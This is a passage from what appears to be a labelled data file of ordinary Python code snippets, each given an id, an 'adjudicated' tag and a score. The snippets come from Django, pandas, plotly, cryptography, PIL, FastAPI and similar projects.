            with self._cell_cancel_scope:
                return await coro
            self._cell_cancel_scope = None

        return trio.from_thread.run(loc, async_fn, trio_token=self._trio_token)"
245	adjudicated	0	"from .models import OrderedDrug, Order
from django.dispatch import receiver
from django.db.models.signals import post_save, post_delete
from notifications_app.tasks import create_notification, delete_notifications
from django.db.transaction import on_commit
from .tasks import set_drug_quantity
from django.contrib.auth import get_user_model

User = get_user_model()


@receiver(post_save, sender=OrderedDrug)
def reduce_drug_quantity(instance, **kwargs):
    on_commit(lambda: set_drug_quantity.delay(instance.drug.id, -instance.quantity))


@receiver(post_delete, sender=OrderedDrug)
def rollback_drug_quantity(instance, **kwargs):
    on_commit(lambda: set_drug_quantity.delay(instance.drug.id, instance.quantity))


@receiver(post_save, sender=Order)
def send_creation_notif(instance, created, **kwargs):
    if created:
        admin = User.objects.get(is_staff=1)
        data = {
            ""sender_id"": instance.user.id,
            ""receiver_id"": admin.id,
            ""options"": {
                ""message"": f""the user {instance.user.full_name} asks order"",
                ""order_id"": instance.id,
            },
        }
        on_commit(lambda: create_notification.delay(**data))


@receiver(post_save, sender=Order)
def send_approving_notif(instance, **kwargs):
    if instance.status == ""Completed"":
        admin = User.objects.get(is_staff=1)
        data = {
            ""sender_id"": admin.id,
            ""receiver_id"": instance.user.id,
            ""options"": {
                ""message"": f""the admin approve your order order"",
                ""order_id"": instance.id,
            },
        }
        on_commit(lambda: create_notification.delay(**data))


@receiver(post_delete, sender=Order)
def send_notification(instance, **kwargs):
    on_commit(lambda: delete_notifications.delay(instance.id, ""order_id""))"
94	adjudicated	2	"from django.conf import settings
from django.utils.translation import get_supported_language_variant
from django.utils.translation.trans_real import language_code_re

from . import Error, Tags, register

E001 = Error(
    ""You have provided an invalid value for the LANGUAGE_CODE setting: {!r}."",
    id=""translation.E001"",
)

E002 = Error(
    ""You have provided an invalid language code in the LANGUAGES setting: {!r}."",
    id=""translation.E002"",
)

E003 = Error(
    ""You have provided an invalid language code in the LANGUAGES_BIDI setting: {!r}."",
    id=""translation.E003"",
)

E004 = Error(
    ""You have provided a value for the LANGUAGE_CODE setting that is not in ""
    ""the LANGUAGES setting."",
    id=""translation.E004"",
)


@register(Tags.translation)
def check_setting_language_code(app_configs, **kwargs):
    """"""Error if LANGUAGE_CODE setting is invalid.""""""
    tag = settings.LANGUAGE_CODE
    if not isinstance(tag, str) or not language_code_re.match(tag):
        return [Error(E001.msg.format(tag), id=E001.id)]
    return []


@register(Tags.translation)
def check_setting_languages(app_configs, **kwargs):
    """"""Error if LANGUAGES setting is invalid.""""""
    return [
        Error(E002.msg.format(tag), id=E002.id)
        for tag, _ in settings.LANGUAGES
        if not isinstance(tag, str) or not language_code_re.match(tag)
    ]


@register(Tags.translation)
def check_setting_languages_bidi(app_configs, **kwargs):
    """"""Error if LANGUAGES_BIDI setting is invalid.""""""
    return [
        Error(E003.msg.format(tag), id=E003.id)
        for tag in settings.LANGUAGES_BIDI
        if not isinstance(tag, str) or not language_code_re.match(tag)
    ]


@register(Tags.translation)
def check_language_settings_consistent(app_configs, **kwargs):
    """"""Error if language settings are not consistent with each other.""""""
    try:
        get_supported_language_variant(settings.LANGUAGE_CODE)
    except LookupError:
        return [E004]
    else:
        return []"
127	adjudicated	2	"# This file is dual licensed under the terms of the Apache License, Version
# 2.0, and the BSD License. See the LICENSE file in the root of this repository
# for complete details.
from __future__ import absolute_import, division, print_function


class InfinityType(object):
    def __repr__(self):
        # type: () -> str
        return ""Infinity""

    def __hash__(self):
        # type: () -> int
        return hash(repr(self))

    def __lt__(self, other):
        # type: (object) -> bool
        return False

    def __le__(self, other):
        # type: (object) -> bool
        return False

    def __eq__(self, other):
        # type: (object) -> bool
        return isinstance(other, self.__class__)

    def __ne__(self, other):
        # type: (object) -> bool
        return not isinstance(other, self.__class__)

    def __gt__(self, other):
        # type: (object) -> bool
        return True

    def __ge__(self, other):
        # type: (object) -> bool
        return True

    def __neg__(self):
        # type: (object) -> NegativeInfinityType
        return NegativeInfinity


Infinity = InfinityType()


class NegativeInfinityType(object):
    def __repr__(self):
        # type: () -> str
        return ""-Infinity""

    def __hash__(self):
        # type: () -> int
        return hash(repr(self))

    def __lt__(self, other):
        # type: (object) -> bool
        return True

    def __le__(self, other):
        # type: (object) -> bool
        return True

    def __eq__(self, other):
        # type: (object) -> bool
        return isinstance(other, self.__class__)

    def __ne__(self, other):
        # type: (object) -> bool
        return not isinstance(other, self.__class__)

    def __gt__(self, other):
        # type: (object) -> bool
        return False

    def __ge__(self, other):
        # type: (object) -> bool
        return False

    def __neg__(self):
        # type: (object) -> InfinityType
        return Infinity


NegativeInfinity = NegativeInfinityType()"
67	adjudicated	1	"# Generated by Django 4.1.5 on 2023-03-07 04:49

from django.db import migrations, models


class Migration(migrations.Migration):

    dependencies = [
        ('rto', '0001_initial'),
    ]

    operations = [
        migrations.CreateModel(
            name='Rules',
            fields=[
                ('rule_id', models.AutoField(primary_key=True, serialize=False)),
                ('rule_code', models.CharField(max_length=50)),
                ('rule_desc', models.CharField(blank=True, max_length=100)),
                ('rule_sect', models.CharField(max_length=50, null=True)),
                ('rule_pen', models.CharField(max_length=100, null=True)),
            ],
        ),
        migrations.CreateModel(
            name='Vehicle',
            fields=[
                ('vehicle_id', models.AutoField(primary_key=True, serialize=False)),
                ('vehicle_no', models.CharField(default=None, max_length=50)),
                ('vehicle_own_name', models.CharField(default=None, max_length=50)),
                ('vehicle_own_contact', models.IntegerField(default=None)),
                ('vehicle_own_add', models.CharField(default=None, max_length=100)),
                ('vehicle_own_email', models.CharField(default=None, max_length=50)),
                ('vehicle_company_name', models.CharField(default=None, max_length=50)),
                ('vehicle_date_reg', models.DateField(default=None)),
                ('vehicle_chassics_no', models.CharField(default=None, max_length=30)),
                ('vehicle_eng_no', models.CharField(default=None, max_length=30)),
                ('vehicle_own_srno', models.IntegerField(default=None)),
                ('vehicle_fuel_use', models.CharField(default=None, max_length=30)),
                ('vehicle_Seat_cap', models.IntegerField(default=None)),
                ('vehicle_model_name', models.CharField(default=None, max_length=50)),
                ('vehicle_created_date', models.DateField(auto_now_add=True)),
                ('vehicle_last_login', models.CharField(default=None, max_length=30)),
            ],
        ),
    ]"
176	adjudicated	2	"import pytest

from pandas import TimedeltaIndex

from pandas.tseries.offsets import (
    DateOffset,
    Day,
    Hour,
)


class TestFreq:
    @pytest.mark.parametrize(""values"", [[""0 days"", ""2 days"", ""4 days""], []])
    @pytest.mark.parametrize(""freq"", [""2D"", Day(2), ""48H"", Hour(48)])
    def test_freq_setter(self, values, freq):
        # GH#20678
        idx = TimedeltaIndex(values)

        # can set to an offset, converting from string if necessary
        idx._data.freq = freq
        assert idx.freq == freq
        assert isinstance(idx.freq, DateOffset)

        # can reset to None
        idx._data.freq = None
        assert idx.freq is None

    def test_freq_setter_errors(self):
        # GH#20678
        idx = TimedeltaIndex([""0 days"", ""2 days"", ""4 days""])

        # setting with an incompatible freq
        msg = (
            ""Inferred frequency 2D from passed values does not conform to ""
            ""passed frequency 5D""
        )
        with pytest.raises(ValueError, match=msg):
            idx._data.freq = ""5D""

        # setting with a non-fixed frequency
        msg = r""<2 \* BusinessDays> is a non-fixed frequency""
        with pytest.raises(ValueError, match=msg):
            idx._data.freq = ""2B""

        # setting with non-freq string
        with pytest.raises(ValueError, match=""Invalid frequency""):
            idx._data.freq = ""foo""

    def test_freq_view_safe(self):
        # Setting the freq for one TimedeltaIndex shouldn't alter the freq
        #  for another that views the same data

        tdi = TimedeltaIndex([""0 days"", ""2 days"", ""4 days""], freq=""2D"")
        tda = tdi._data

        tdi2 = TimedeltaIndex(tda)._with_freq(None)
        assert tdi2.freq is None

        # Original was not altered
        assert tdi.freq == ""2D""
        assert tda.freq == ""2D"""
26	adjudicated	0	"from typing import Optional

from fastapi import Depends, HTTPException, Path, Query
from starlette import status

from app.api.dependencies.authentication import get_current_user_authorizer
from app.api.dependencies.database import get_repository
from app.db.errors import EntityDoesNotExist
from app.db.repositories.items import ItemsRepository
from app.models.domain.items import Item
from app.models.domain.users import User
from app.models.schemas.items import (
    DEFAULT_ITEMS_LIMIT,
    DEFAULT_ITEMS_OFFSET,
    ItemsFilters,
)
from app.resources import strings
from app.services.items import check_user_can_modify_item


def get_items_filters(
    tag: Optional[str] = None,
    seller: Optional[str] = None,
    favorited: Optional[str] = None,
    limit: int = Query(DEFAULT_ITEMS_LIMIT, ge=1),
    offset: int = Query(DEFAULT_ITEMS_OFFSET, ge=0),
) -> ItemsFilters:
    return ItemsFilters(
        tag=tag,
        seller=seller,
        favorited=favorited,
        limit=limit,
        offset=offset,
    )


async def get_item_by_slug_from_path(
    slug: str = Path(..., min_length=1),
    user: Optional[User] = Depends(get_current_user_authorizer(required=False)),
    items_repo: ItemsRepository = Depends(get_repository(ItemsRepository)),
) -> Item:
    try:
        return await items_repo.get_item_by_slug(slug=slug, requested_user=user)
    except EntityDoesNotExist:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail=strings.ITEM_DOES_NOT_EXIST_ERROR,
        )


def check_item_modification_permissions(
    current_item: Item = Depends(get_item_by_slug_from_path),
    user: User = Depends(get_current_user_authorizer()),
) -> None:
    if not check_user_can_modify_item(current_item, user):
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail=strings.USER_IS_NOT_SELLER_OF_ITEM,
        )"
166	adjudicated	2	"__all__ = ['Version']


import typing as t

from ..function import deprecated_classmethod

if t.TYPE_CHECKING:
    import typing_extensions as te


class Version(t.NamedTuple):
    '''Version named tuple

    Example:
        >>> version = Version.fromString('1.2.x')
        >>> version.major, version.minor, version.other, version.micro
        (1, 2, 'x', None)
        >>> version.to_string()
        '1.2.x'
    '''

    major: int
    minor: int
    other: t.Optional[str]

    def __lt__(self, other: 'te.Self') -> bool:
        return (self.major, self.minor) < (other.major, other.minor)

    def __gt__(self, other: 'te.Self') -> bool:
        return other.__lt__(self)

    def __repr__(self) -> str:
        return f'Version.fromString({self.to_string()!r})'

    def __str__(self) -> str:
        return self.to_string()

    @classmethod
    def fromString(cls, version: str) -> 'te.Self':
        parts = version.split('.', maxsplit=2)
        if len(parts) == 2:
            major, minor = parts
            other = None
        elif len(parts) == 3:
            major, minor, other = parts
        else:
            raise Exception(f'""{version}"" is not a valid version string')
        return cls(int(major), int(minor), other)

    @property
    def micro(self) -> t.Optional[int]:
        if self.other is not None:
            parts = self.other.split('.')
            if parts and parts[0].isdigit():
                return int(parts[0])
        return None

    @property
    def micro_int(self) -> int:
        return self.micro or 0

    def to_string(self) -> str:
        version = f'{self.major}.{self.minor}'
        if self.other is not None:
            version += f'.{self.other}'
        return version

    from_string = deprecated_classmethod(fromString)"
77	adjudicated	4	"""""""tst_tc2236_hstvprde_68491 URL Configuration

The `urlpatterns` list routes URLs to views. For more information please see:
    https://docs.djangoproject.com/en/2.2/topics/http/urls/
Examples:
Function views
    1. Add an import:  from my_app import views
    2. Add a URL to urlpatterns:  path('', views.home, name='home')
Class-based views
    1. Add an import:  from other_app.views import Home
    2. Add a URL to urlpatterns:  path('', Home.as_view(), name='home')
Including another URLconf
    1. Import the include() function: from django.urls import include, path
    2. Add a URL to urlpatterns:  path('blog/', include('blog.urls'))
""""""

from django.contrib import admin
from django.urls import path, include, re_path
from django.views.generic.base import TemplateView
from allauth.account.views import confirm_email
from rest_framework import permissions
from drf_spectacular.views import SpectacularJSONAPIView, SpectacularSwaggerView

urlpatterns = [
    
    path(""accounts/"", include(""allauth.urls"")),
    path(""modules/"", include(""modules.urls"")),
    path(""api/v1/"", include(""home.api.v1.urls"")),
    path(""admin/"", admin.site.urls),
    path(""users/"", include(""users.urls"", namespace=""users"")),
    path(""rest-auth/"", include(""rest_auth.urls"")),
    # Override email confirm to use allauth's HTML view instead of rest_auth's API view
    path(""rest-auth/registration/account-confirm-email/<str:key>/"", confirm_email),
    path(""rest-auth/registration/"", include(""rest_auth.registration.urls"")),
]

admin.site.site_header = ""TST-TC2236-hstvprdenr""
admin.site.site_title = ""TST-TC2236-hstvprdenr Admin Portal""
admin.site.index_title = ""TST-TC2236-hstvprdenr Admin""

# swagger
urlpatterns += [
    path(""api-docs/schema/"", SpectacularJSONAPIView.as_view(), name=""schema""),
    path(""api-docs/"", SpectacularSwaggerView.as_view(url_name='schema'), name=""api_docs"")
]


urlpatterns += [re_path(r"".*"",TemplateView.as_view(template_name='index.html'))]"
137	adjudicated	2	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(
        self, plotly_name=""font"", parent_name=""scatterternary.hoverlabel"", **kwargs
    ):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
84	adjudicated	4	"# -*- coding: utf-8 -*-
import re

from django.template import Library
from django.utils.encoding import force_str


register = Library()
re_widont = re.compile(r'\s+(\S+\s*)$')
re_widont_html = re.compile(r'([^<>\s])\s+([^<>\s]+\s*)(</?(?:address|blockquote|br|dd|div|dt|fieldset|form|h[1-6]|li|noscript|p|td|th)[^>]*>|$)', re.IGNORECASE)


@register.filter
def widont(value, count=1):
    """"""
    Add an HTML non-breaking space between the final two words of the string to
    avoid ""widowed"" words.

    Examples:

    >>> print(widont('Test   me   out'))
    Test   me&nbsp;out

    >>> print(""'"",widont('It works with trailing spaces too  '), ""'"")
    ' It works with trailing spaces&nbsp;too   '

    >>> print(widont('NoEffect'))
    NoEffect
    """"""
    def replace(matchobj):
        return force_str('&nbsp;%s' % matchobj.group(1))
    for i in range(count):
        value = re_widont.sub(replace, force_str(value))
    return value


@register.filter
def widont_html(value):
    """"""
    Add an HTML non-breaking space between the final two words at the end of
    (and in sentences just outside of) block level tags to avoid ""widowed""
    words.

    Examples:

    >>> print(widont_html('<h2>Here is a simple  example  </h2> <p>Single</p>'))
    <h2>Here is a simple&nbsp;example  </h2> <p>Single</p>

    >>> print(widont_html('<p>test me<br /> out</p><h2>Ok?</h2>Not in a p<p title=""test me"">and this</p>'))
    <p>test&nbsp;me<br /> out</p><h2>Ok?</h2>Not in a&nbsp;p<p title=""test me"">and&nbsp;this</p>

    >>> print(widont_html('leading text  <p>test me out</p>  trailing text'))
    leading&nbsp;text  <p>test me&nbsp;out</p>  trailing&nbsp;text
    """"""
    def replace(matchobj):
        return force_str('%s&nbsp;%s%s' % matchobj.groups())
    return re_widont_html.sub(replace, force_str(value))


if __name__ == ""__main__"":
    def _test():
        import doctest
        doctest.testmod()
    _test()"
315	adjudicated	0	"# This file is dual licensed under the terms of the Apache License, Version
# 2.0, and the BSD License. See the LICENSE file in the root of this repository
# for complete details.

import typing

from cryptography import utils
from cryptography.exceptions import (
    AlreadyFinalized,
    UnsupportedAlgorithm,
    _Reasons,
)
from cryptography.hazmat.backends.openssl.poly1305 import _Poly1305Context


class Poly1305:
    _ctx: typing.Optional[_Poly1305Context]

    def __init__(self, key: bytes):
        from cryptography.hazmat.backends.openssl.backend import backend

        if not backend.poly1305_supported():
            raise UnsupportedAlgorithm(
                ""poly1305 is not supported by this version of OpenSSL."",
                _Reasons.UNSUPPORTED_MAC,
            )
        self._ctx = backend.create_poly1305_ctx(key)

    def update(self, data: bytes) -> None:
        if self._ctx is None:
            raise AlreadyFinalized(""Context was already finalized."")
        utils._check_byteslike(""data"", data)
        self._ctx.update(data)

    def finalize(self) -> bytes:
        if self._ctx is None:
            raise AlreadyFinalized(""Context was already finalized."")
        mac = self._ctx.finalize()
        self._ctx = None
        return mac

    def verify(self, tag: bytes) -> None:
        utils._check_bytes(""tag"", tag)
        if self._ctx is None:
            raise AlreadyFinalized(""Context was already finalized."")

        ctx, self._ctx = self._ctx, None
        ctx.verify(tag)

    @classmethod
    def generate_tag(cls, key: bytes, data: bytes) -> bytes:
        p = Poly1305(key)
        p.update(data)
        return p.finalize()

    @classmethod
    def verify_tag(cls, key: bytes, data: bytes, tag: bytes) -> None:
        p = Poly1305(key)
        p.update(data)
        p.verify(tag)"
255	adjudicated	2	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""hoverlabel"", parent_name=""densitymapbox"", **kwargs):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
344	adjudicated	1	"#
# The Python Imaging Library.
# $Id$
#
# DCX file handling
#
# DCX is a container file format defined by Intel, commonly used
# for fax applications.  Each DCX file consists of a directory
# (a list of file offsets) followed by a set of (usually 1-bit)
# PCX files.
#
# History:
# 1995-09-09 fl   Created
# 1996-03-20 fl   Properly derived from PcxImageFile.
# 1998-07-15 fl   Renamed offset attribute to avoid name clash
# 2002-07-30 fl   Fixed file handling
#
# Copyright (c) 1997-98 by Secret Labs AB.
# Copyright (c) 1995-96 by Fredrik Lundh.
#
# See the README file for information on usage and redistribution.
#

from . import Image
from ._binary import i32le as i32
from .PcxImagePlugin import PcxImageFile

MAGIC = 0x3ADE68B1  # QUIZ: what's this value, then?


def _accept(prefix):
    return len(prefix) >= 4 and i32(prefix) == MAGIC


##
# Image plugin for the Intel DCX format.


class DcxImageFile(PcxImageFile):

    format = ""DCX""
    format_description = ""Intel DCX""
    _close_exclusive_fp_after_loading = False

    def _open(self):

        # Header
        s = self.fp.read(4)
        if not _accept(s):
            msg = ""not a DCX file""
            raise SyntaxError(msg)

        # Component directory
        self._offset = []
        for i in range(1024):
            offset = i32(self.fp.read(4))
            if not offset:
                break
            self._offset.append(offset)

        self._fp = self.fp
        self.frame = None
        self.n_frames = len(self._offset)
        self.is_animated = self.n_frames > 1
        self.seek(0)

    def seek(self, frame):
        if not self._seek_check(frame):
            return
        self.frame = frame
        self.fp = self._fp
        self.fp.seek(self._offset[frame])
        PcxImageFile._open(self)

    def tell(self):
        return self.frame


Image.register_open(DcxImageFile.format, DcxImageFile, _accept)

Image.register_extension(DcxImageFile.format, "".dcx"")"
195	adjudicated	2	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""font"", parent_name=""pie.title"", **kwargs):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
204	adjudicated	2	"from . import engines
from .exceptions import TemplateDoesNotExist


def get_template(template_name, using=None):
    """"""
    Load and return a template for the given name.

    Raise TemplateDoesNotExist if no such template exists.
    """"""
    chain = []
    engines = _engine_list(using)
    for engine in engines:
        try:
            return engine.get_template(template_name)
        except TemplateDoesNotExist as e:
            chain.append(e)

    raise TemplateDoesNotExist(template_name, chain=chain)


def select_template(template_name_list, using=None):
    """"""
    Load and return a template for one of the given names.

    Try names in order and return the first template found.

    Raise TemplateDoesNotExist if no such template exists.
    """"""
    if isinstance(template_name_list, str):
        raise TypeError(
            ""select_template() takes an iterable of template names but got a ""
            ""string: %r. Use get_template() if you want to load a single ""
            ""template by name."" % template_name_list
        )

    chain = []
    engines = _engine_list(using)
    for template_name in template_name_list:
        for engine in engines:
            try:
                return engine.get_template(template_name)
            except TemplateDoesNotExist as e:
                chain.append(e)

    if template_name_list:
        raise TemplateDoesNotExist("", "".join(template_name_list), chain=chain)
    else:
        raise TemplateDoesNotExist(""No template names provided"")


def render_to_string(template_name, context=None, request=None, using=None):
    """"""
    Load a template and render it with a context. Return a string.

    template_name may be a string or a list of strings.
    """"""
    if isinstance(template_name, (list, tuple)):
        template = select_template(template_name, using=using)
    else:
        template = get_template(template_name, using=using)
    return template.render(context, request)


def _engine_list(using=None):
    return engines.all() if using is None else [engines[using]]"
103	adjudicated	1	"from minerl.herobraine.hero import handlers
from typing import List
from minerl.herobraine.hero.handlers.translation import TranslationHandler
import time
from minerl.herobraine.env_specs.navigate_specs import Navigate

import coloredlogs
import logging

color = coloredlogs.install(level=logging.DEBUG)


# Let's also test monitors

class NavigateWithDistanceMonitor(Navigate):
    def create_monitors(self) -> List[TranslationHandler]:
        return [
            handlers.CompassObservation(angle=False, distance=True)
        ]


def _test_fake_env(env_spec, should_render=False):
    # Make the env.
    fake_env = env_spec.make(fake=True)

    assert fake_env.action_space == fake_env.task.action_space
    assert fake_env.observation_space == fake_env.observation_space

    assert fake_env._seed == None

    fake_env.seed(200)
    assert fake_env._seed == 200
    fake_obs = fake_env.reset()

    assert fake_obs in env_spec.observation_space

    for _ in range(100):
        fake_obs, _, _, fake_monitor = fake_env.step(fake_env.action_space.sample())
        if should_render:
            fake_env.render()
            time.sleep(0.1)
        assert fake_obs in env_spec.observation_space
        assert fake_monitor in env_spec.monitor_space


def test_fake_navigate():
    _test_fake_env(Navigate(dense=True, extreme=False))
    _test_fake_env(Navigate(dense=True, extreme=False, agent_count=3))


def test_fake_navigate_with_distance_monitor():
    task = NavigateWithDistanceMonitor(dense=True, extreme=False)
    fake_env = task.make(fake=True)
    _ = fake_env.reset()

    for _ in range(100):
        fake_obs, _, _, fake_monitor = fake_env.step(fake_env.action_space.sample())
        assert fake_monitor in fake_env.monitor_space
        assert ""compass"" in fake_monitor
        assert ""distance"" in fake_monitor[""compass""]


if __name__ == ""__main__"":
    # _test_fake_env(Navigate(dense=True, extreme=False), should_render=True)
    _test_fake_env(Navigate(dense=True, extreme=False, agent_count=3), should_render=True)
    # test_fake_navigate_with_distance_monitor()"
292	adjudicated	0	"# This file is dual licensed under the terms of the Apache License, Version
# 2.0, and the BSD License. See the LICENSE file in the root of this repository
# for complete details.


import typing

from cryptography import utils
from cryptography.exceptions import AlreadyFinalized, InvalidKey
from cryptography.hazmat.primitives import constant_time, hashes
from cryptography.hazmat.primitives.kdf import KeyDerivationFunction


def _int_to_u32be(n: int) -> bytes:
    return n.to_bytes(length=4, byteorder=""big"")


class X963KDF(KeyDerivationFunction):
    def __init__(
        self,
        algorithm: hashes.HashAlgorithm,
        length: int,
        sharedinfo: typing.Optional[bytes],
        backend: typing.Any = None,
    ):
        max_len = algorithm.digest_size * (2**32 - 1)
        if length > max_len:
            raise ValueError(
                ""Cannot derive keys larger than {} bits."".format(max_len)
            )
        if sharedinfo is not None:
            utils._check_bytes(""sharedinfo"", sharedinfo)

        self._algorithm = algorithm
        self._length = length
        self._sharedinfo = sharedinfo
        self._used = False

    def derive(self, key_material: bytes) -> bytes:
        if self._used:
            raise AlreadyFinalized
        self._used = True
        utils._check_byteslike(""key_material"", key_material)
        output = [b""""]
        outlen = 0
        counter = 1

        while self._length > outlen:
            h = hashes.Hash(self._algorithm)
            h.update(key_material)
            h.update(_int_to_u32be(counter))
            if self._sharedinfo is not None:
                h.update(self._sharedinfo)
            output.append(h.finalize())
            outlen += len(output[-1])
            counter += 1

        return b"""".join(output)[: self._length]

    def verify(self, key_material: bytes, expected_key: bytes) -> None:
        if not constant_time.bytes_eq(self.derive(key_material), expected_key):
            raise InvalidKey"
43	adjudicated	4	"""""""
Strava OAuth2 backend, docs at:
    https://python-social-auth.readthedocs.io/en/latest/backends/strava.html
""""""
from .oauth import BaseOAuth2


class StravaOAuth(BaseOAuth2):
    name = 'strava'
    AUTHORIZATION_URL = 'https://www.strava.com/oauth/authorize'
    ACCESS_TOKEN_URL = 'https://www.strava.com/oauth/token'
    ACCESS_TOKEN_METHOD = 'POST'
    # Strava doesn't check for parameters in redirect_uri and directly appends
    # the auth parameters to it, ending with an URL like:
    # http://example.com/complete/strava?redirect_state=xxx?code=xxx&state=xxx
    # Check issue #259 for details.
    REDIRECT_STATE = False
    REVOKE_TOKEN_URL = 'https://www.strava.com/oauth/deauthorize'
    SCOPE_SEPARATOR = ','
    EXTRA_DATA = [
        ('refresh_token', 'refresh_token'),
        ('expires_in', 'expires'),
    ]

    def get_user_id(self, details, response):
        return response['athlete']['id']

    def get_user_details(self, response):
        """"""Return user details from Strava account""""""
        username = response['athlete'].get('username', '')
        fullname, first_name, last_name = self.get_user_names(
            first_name=response['athlete'].get('firstname', ''),
            last_name=response['athlete'].get('lastname', ''),
        )
        return {'username': username,
                'fullname': fullname,
                'first_name': first_name,
                'last_name': last_name}

    def user_data(self, access_token, *args, **kwargs):
        """"""Loads user data from service""""""
        return self.get_json('https://www.strava.com/api/v3/athlete',
                             params={'access_token': access_token})

    def revoke_token_params(self, token, uid):
        params = super().revoke_token_params(token, uid)
        params['access_token'] = token
        return params"
152	adjudicated	2	"import os
import shutil
import tempfile

import pytest

from pathy import Pathy

is_windows = os.name == ""nt""


@pytest.mark.skipif(not is_windows, reason=""requires windows"")
def test_windows_fluid_absolute_paths() -> None:
    # Path with \\ slashes
    tmp_dir = tempfile.mkdtemp()
    # Converted to the same path with / slashes
    alt_slashes = tmp_dir.replace(""\\\\"", ""/"").replace(""\\"", ""/"")

    # Make a folder from \\ absolute path
    fs_root = Pathy.fluid(tmp_dir)
    assert ""\\"" in str(fs_root), ""expected \\ separators in windows path""
    new_folder = Pathy.fluid(fs_root / ""sub-dir"")
    assert new_folder.exists() is False
    new_folder.mkdir()
    assert new_folder.exists() is True

    # Make a folder from / absolute path
    fs_root = Pathy.fluid(alt_slashes)
    new_folder = Pathy.fluid(fs_root / ""sub-dir-alt"")
    assert new_folder.exists() is False
    new_folder.mkdir()
    assert new_folder.exists() is True

    shutil.rmtree(tmp_dir)


@pytest.mark.skipif(not is_windows, reason=""requires windows"")
def test_windows_fluid_absolute_file_paths() -> None:
    # Path with \\ slashes
    tmp_dir = tempfile.mkdtemp()
    # Converted to the same path with / slashes
    alt_slashes = tmp_dir.replace(""\\\\"", ""/"").replace(""\\"", ""/"")

    # Make a folder from \\ absolute path
    fs_root = Pathy.fluid(f""file://{tmp_dir}"")
    assert ""\\"" in str(fs_root), ""expected \\ separators in windows path""
    new_folder = Pathy.fluid(fs_root / ""sub-dir"")
    assert new_folder.exists() is False
    new_folder.mkdir()
    assert new_folder.exists() is True

    # Make a folder from / absolute path
    fs_root = Pathy.fluid(f""file://{alt_slashes}"")
    new_folder = Pathy.fluid(fs_root / ""sub-dir-alt/"")
    assert new_folder.exists() is False
    new_folder.mkdir()
    assert new_folder.exists() is True

    shutil.rmtree(tmp_dir)"
12	adjudicated	2	"""""""
Create a dist_info directory
As defined in the wheel specification
""""""

import os
import re
import warnings
from inspect import cleandoc

from distutils.core import Command
from distutils import log
from setuptools.extern import packaging


class dist_info(Command):

    description = 'create a .dist-info directory'

    user_options = [
        ('egg-base=', 'e', ""directory containing .egg-info directories""
                           "" (default: top of the source tree)""),
    ]

    def initialize_options(self):
        self.egg_base = None

    def finalize_options(self):
        pass

    def run(self):
        egg_info = self.get_finalized_command('egg_info')
        egg_info.egg_base = self.egg_base
        egg_info.finalize_options()
        egg_info.run()
        name = _safe(self.distribution.get_name())
        version = _version(self.distribution.get_version())
        base = self.egg_base or os.curdir
        dist_info_dir = os.path.join(base, f""{name}-{version}.dist-info"")
        log.info(""creating '{}'"".format(os.path.abspath(dist_info_dir)))

        bdist_wheel = self.get_finalized_command('bdist_wheel')
